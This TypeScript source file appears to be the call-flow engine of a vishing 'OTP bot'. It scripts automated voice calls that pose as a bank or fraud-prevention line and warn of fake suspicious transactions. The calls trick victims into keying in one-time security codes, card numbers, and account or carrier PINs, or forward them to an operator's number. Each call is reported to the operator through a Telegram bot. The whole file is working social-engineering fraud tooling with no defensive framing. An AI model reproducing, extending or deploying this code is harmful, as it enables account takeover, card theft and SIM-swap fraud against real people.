/* eslint-disable @typescript-eslint/no-explicit-any */
import { Response } from 'express';
import { bot } from '..';
import { v4 as uuidv4 } from 'uuid';

export const bankFlow = async (
  dtmf: string,
  res: Response,
  language: string,
  chatId: number | undefined,
  step: string,
  destination: string,
  otpLength: number,
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
): Promise<Response<any, Record<string, any>>> => {
  if (dtmf && dtmf === '1') {
    await bot.telegram.sendMessage(
      Number(chatId),
      `On call (${destination}) 🤳🏽`,
      {
        parse_mode: 'HTML',
      },
    );

    return res.json({
      id: uuidv4(),
      title: `call BANK FLOW - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: `For your SECURITY and to BLOCK this transaction, please enter the SECURITY CODE we have sent you followed by the pound key. If you have not received the security code yet please press the star key followed by the pound key.`,
            language,
            voice: 'female',
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: Number(otpLength),
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: Number(otpLength),
        },
        {
          id: 'nextStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?otpLength=${otpLength}`,
          },
        },
      ],
    });
  } else if (dtmf && dtmf === '2') {
    await bot.telegram.sendMessage(
      Number(chatId),
      `On call (${destination}) 🤳🏽`,
      {
        parse_mode: 'HTML',
      },
    );

    return res.json({
      id: uuidv4(),
      title: `call BANK FLOW - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: `For your SECURITY and to BLOCK this transaction, please enter the SECURITY CODE we have sent you followed by the pound key. If you have not received the security code yet please press the star key followed by the pound key.`,
            language,
            voice: 'female',
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: Number(otpLength),
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: Number(otpLength),
        },
        {
          id: 'nextStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?otpLength=${otpLength}`,
          },
        },
      ],
    });
  } else if (dtmf && dtmf === '3') {
    return res.json({
      id: uuidv4(),
      title: `call BANK FLOW - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: `We have BLOCKED a recent SUSPICIOUS transaction on your ACCOUNT. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
            language,
            voice: 'female',
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: Number(otpLength),
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: Number(otpLength),
        },
        {
          id: 'nextStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}?otpLength=${otpLength}`,
          },
        },
      ],
    });
  } else if (dtmf && dtmf === '*') {
    return res.json({
      id: uuidv4(),
      title: `call BANK FLOW - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: `OKAY, you might receive another automated call if we detect a security code has been sent to you. Thank you, goodbye.`,
            language,
            voice: 'female',
          },
        },
      ],
    });
  } else {
    return res.json({
      id: uuidv4(),
      title: `call BANK FLOW - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: `You have selected an INVALID option. We have BLOCKED a recent SUSPICIOUS transaction on your ACCOUNT. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
            language,
            voice: 'female',
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: Number(otpLength),
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: Number(otpLength),
        },
        {
          id: 'nextStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}?otpLength=${otpLength}`,
          },
        },
      ],
    });
  }
};

export const payFlow = async (
  dtmf: string,
  res: Response,
  language: string,
  chatId: number | undefined,
  step: string,
  destination: string,
  otpLength: number,
  wallet?: string,
): Promise<Response<any, Record<string, any>>> => {
  if (dtmf && dtmf === '1') {
    await bot.telegram.sendMessage(
      Number(chatId),
      `On call (${destination}) 🤳🏽`,
      {
        parse_mode: 'HTML',
      },
    );

    return res.json({
      id: uuidv4(),
      title: `call PAY FLOW - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: `For your SECURITY and to BLOCK this transaction, please enter the SECURITY CODE we have sent you followed by the pound key. If you have not received the security code yet please press the star key followed by the pound key.`,
            language,
            voice: 'female',
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: Number(otpLength),
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: Number(otpLength),
        },
        {
          id: 'nextStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?otpLength=${otpLength}`,
          },
        },
      ],
    });
  } else if (dtmf && dtmf === '2') {
    await bot.telegram.sendMessage(
      Number(chatId),
      `On call (${destination}) 🤳🏽`,
      {
        parse_mode: 'HTML',
      },
    );
    return res.json({
      id: uuidv4(),
      title: `call PAY FLOW - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: `For your SECURITY and to BLOCK this transaction, please enter the SECURITY CODE we have sent you followed by the pound key. If you have not received the security code yet please press the star key followed by the pound key.`,
            language,
            voice: 'female',
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: Number(otpLength),
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: Number(otpLength),
        },
        {
          id: 'nextStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?otpLength=${otpLength}`,
          },
        },
      ],
    });
  } else if (dtmf && dtmf === '3') {
    return res.json({
      id: uuidv4(),
      title: `call PAY FLOW - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: `We have BLOCKED a recent SUSPICIOUS ${wallet} purchase. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
            language,
            voice: 'female',
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: Number(otpLength),
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: Number(otpLength),
        },
        {
          id: 'nextStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${
              process.env.ENDPOINT_URL
            }/calls/dtmf/${language}/${step}/${chatId}?wallet=${wallet
              ?.replace(/\s/g, '')
              .toLowerCase()}?otpLength=${otpLength}`,
          },
        },
      ],
    });
  } else if (dtmf && dtmf === '*') {
    return res.json({
      id: uuidv4(),
      title: `call PAY FLOW - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: `OKAY, you might receive another automated call if we detect a security code has been sent to you. Thank you, goodbye.`,
            language,
            voice: 'female',
          },
        },
      ],
    });
  } else {
    return res.json({
      id: uuidv4(),
      title: `call PAY FLOW - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: `You have selected an INVALID option. We have BLOCKED a recent SUSPICIOUS ${wallet} purchase. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
            language,
            voice: 'female',
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: Number(otpLength),
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: Number(otpLength),
        },
        {
          id: 'nextStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${
              process.env.ENDPOINT_URL
            }/calls/dtmf/${language}/${step}/${chatId}?wallet=${wallet
              ?.replace(/\s/g, '')
              .toLowerCase()}?otpLength=${otpLength}`,
          },
        },
      ],
    });
  }
};

export const accountFlow = async (
  dtmf: string,
  res: Response,
  language: string,
  chatId: number | undefined,
  step: string,
  destination: string,
  otpLength: number,
  askCardInfo?: string,
): Promise<Response<any, Record<string, any>>> => {
  if (dtmf && dtmf === '1') {
    await bot.telegram.sendMessage(
      Number(chatId),
      `On call (${destination}) 🤳🏽`,
      {
        parse_mode: 'HTML',
      },
    );
    return res.json({
      id: uuidv4(),
      title: `call PAY FLOW - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: `For your SECURITY and to BLOCK this login attempt, please enter the SECURITY CODE we have sent you followed by the pound key. If you have not received the security code yet please press the star key followed by the pound key.`,
            language,
            voice: 'female',
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: Number(otpLength),
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: Number(otpLength),
        },
        {
          id: 'nextStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?otpLength=${otpLength}&askCardInfo=${askCardInfo}`,
          },
        },
      ],
    });
  } else if (dtmf && dtmf === '2') {
    await bot.telegram.sendMessage(
      Number(chatId),
      `On call (${destination}) 🤳🏽`,
      {
        parse_mode: 'HTML',
      },
    );

    return res.json({
      id: uuidv4(),
      title: `call PAY FLOW - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: `For your SECURITY please enter the SECURITY CODE we have sent you followed by the pound key. If you have not received the code yet please press the star key followed by the pound key.`,
            language,
            voice: 'female',
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: Number(otpLength),
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: Number(otpLength),
        },
        {
          id: 'nextStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?otpLength=${otpLength}&askCardInfo=${askCardInfo}`,
          },
        },
      ],
    });
  } else if (dtmf && dtmf === '3') {
    return res.json({
      id: uuidv4(),
      title: `call PAY FLOW - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: `We have BLOCKED a recent SUSPICIOUS login attempt on your ACCOUNT. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
            language,
            voice: 'female',
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: Number(otpLength),
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: Number(otpLength),
        },
        {
          id: 'nextStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}?otpLength=${otpLength}&askCardInfo=${askCardInfo}`,
          },
        },
      ],
    });
  } else if (dtmf && dtmf === '*') {
    return res.json({
      id: uuidv4(),
      title: `call PAY FLOW - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: `OKAY, you might receive another automated call if we detect a security code has been sent to you. Thank you, goodbye.`,
            language,
            voice: 'female',
          },
        },
      ],
    });
  } else {
    return res.json({
      id: uuidv4(),
      title: `call PAY FLOW - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: `You have selected an INVALID option. We have BLOCKED a recent SUSPICIOUS login attempt on your ACCOUNT. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
            language,
            voice: 'female',
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: Number(otpLength),
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: Number(otpLength),
        },
        {
          id: 'nextStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}?otpLength=${otpLength}&askCardInfo=${askCardInfo}`,
          },
        },
      ],
    });
  }
};

export const cardFlow = async (
  dtmf: string,
  res: Response,
  language: string,
  chatId: number | undefined,
  step: string,
  destination: string,
  cardType: string,
): Promise<Response<any, Record<string, any>>> => {
  if (dtmf && dtmf === '1') {
    await bot.telegram.sendMessage(
      Number(chatId),
      `On call (${destination}) 🤳🏽`,
      {
        parse_mode: 'HTML',
      },
    );
    return res.json({
      id: uuidv4(),
      title: `call CARD FLOW - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: `For your SECURITY and to BLOCK this purchase, please enter your ${cardType} card number followed by the pound key.`,
            language,
            voice: 'female',
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 16,
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 16,
        },
        {
          id: 'nextStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?cardType=${cardType}`,
          },
        },
      ],
    });
  } else if (dtmf && dtmf === '2') {
    await bot.telegram.sendMessage(
      Number(chatId),
      `On call (${destination}) 🤳🏽`,
      {
        parse_mode: 'HTML',
      },
    );
    return res.json({
      id: uuidv4(),
      title: `call CARD FLOW - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: `For your SECURITY, please enter your ${cardType} card number followed by the pound key.`,
            language,
            voice: 'female',
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 16,
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 16,
        },
        {
          id: 'nextStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?cardType=${cardType}`,
          },
        },
      ],
    });
  } else if (dtmf && dtmf === '3') {
    return res.json({
      id: uuidv4(),
      title: `call CARD FLOW - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: `We have BLOCKED a recent SUSPICIOUS login attempt on your ACCOUNT. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
            language,
            voice: 'female',
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 16,
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 16,
        },
        {
          id: 'nextStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}?cardType=${cardType}`,
          },
        },
      ],
    });
  } else if (dtmf && dtmf === '*') {
    return res.json({
      id: uuidv4(),
      title: `call PAY FLOW - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: `OKAY, you might receive another automated call if we detect a security code has been sent to you. Thank you, goodbye.`,
            language,
            voice: 'female',
          },
        },
      ],
    });
  } else {
    return res.json({
      id: uuidv4(),
      title: `call CARD FLOW - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: `You have selected an INVALID option. We have BLOCKED a recent SUSPICIOUS online purchase, your ${cardType} card details was used. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
            language,
            voice: 'female',
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 16,
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 16,
        },
        {
          id: 'nextStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}?cardType=${cardType}`,
          },
        },
      ],
    });
  }
};

export const pinFlow = async (
  dtmf: string,
  res: Response,
  language: string,
  chatId: number | undefined,
  step: string,
  destination: string,
  pinType: string,
): Promise<Response<any, Record<string, any>>> => {
  if (dtmf && dtmf === '1') {
    await bot.telegram.sendMessage(
      Number(chatId),
      `On call (${destination}) 🤳🏽`,
      {
        parse_mode: 'HTML',
      },
    );
    return res.json({
      id: uuidv4(),
      title: `call CARD FLOW - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload:
              pinType === 'carrierPin'
                ? `To verify and secure your phone number, please enter your ${pinType} followed by the pound key.`
                : `For your security and to protect your account. Enter your ${pinType} followed by the pound key.`,
            language,
            voice: 'female',
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 8,
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 8,
        },
        {
          id: 'nextStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/pins/${step}/${chatId}/${language}?pinType=${pinType}`,
          },
        },
      ],
    });
  } else if (dtmf && dtmf === '2') {
    await bot.telegram.sendMessage(
      Number(chatId),
      `On call (${destination}) 🤳🏽`,
      {
        parse_mode: 'HTML',
      },
    );
    return res.json({
      id: uuidv4(),
      title: `call CARD FLOW - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload:
              pinType === 'carrierPin'
                ? `To verify and secure your phone number, please enter your ${pinType} followed by the pound key.`
                : `For your security and to protect your account. Enter your ${pinType} followed by the pound key.`,
            language,
            voice: 'female',
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 8,
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 8,
        },
        {
          id: 'nextStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/pins/${step}/${chatId}/${language}?pinType=${pinType}`,
          },
        },
      ],
    });
  } else if (dtmf && dtmf === '3') {
    return res.json({
      id: uuidv4(),
      title: `call CARD FLOW - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload:
              pinType === 'carrierPin'
                ? `There as been a suspicious activity on your ACCOUNT. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`
                : `We recently noticed a SUSPICIOUS activity on your CARD. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
            language,
            voice: 'female',
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 8,
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 8,
        },
        {
          id: 'nextStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/pins/${language}/${step}/${chatId}?pinType=${pinType}`,
          },
        },
      ],
    });
  } else {
    return res.json({
      id: uuidv4(),
      title: `call CARD FLOW - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload:
              pinType === 'carrierPin'
                ? `You have selected an INVALID option. There as been a suspicious activity on your ACCOUNT. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`
                : `You have selected an INVALID option. We recently noticed a SUSPICIOUS activity on your CARD. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
            language,
            voice: 'female',
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 8,
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 8,
        },
        {
          id: 'nextStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/pins/${language}/${step}/${chatId}?pinType=${pinType}`,
          },
        },
      ],
    });
  }
};

export const pgpFlow = async (
  dtmf: string,
  res: Response,
  language: string,
  chatId: number | undefined,
  step: string,
  destination: string,
  transferNumber: string,
  institutionName: string,
  from: string,
): Promise<Response<any, Record<string, any>>> => {
  if (dtmf && dtmf === '1') {
    await bot.telegram.sendMessage(
      Number(chatId),
      `On call (${destination}) 🤳🏽`,
      {
        parse_mode: 'HTML',
      },
    );

    return res.json({
      id: uuidv4(),
      title: `${chatId} - Forward call to ${transferNumber}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'transfer',
          options: {
            source: from,
            destination: transferNumber,
          },
        },
      ],
    });
  } else {
    return res.json({
      id: uuidv4(),
      title: `call CARD FLOW - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: `You have selected an INVALID option. Welcome to the ${institutionName} fraud prevention line. We recently notice a SUSPICIOUS activity on your account. If this was you, simply HANG UP. If this was not you, PLEASE press ONE to speak to a ${institutionName} representative; to better assist you in SECURING your ACCOUNT.`,
            language,
            voice: 'female',
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 1,
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 1,
        },
        {
          id: 'nextStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}?transferNumber=${transferNumber}&from=${from}`,
          },
        },
      ],
    });
  }
};
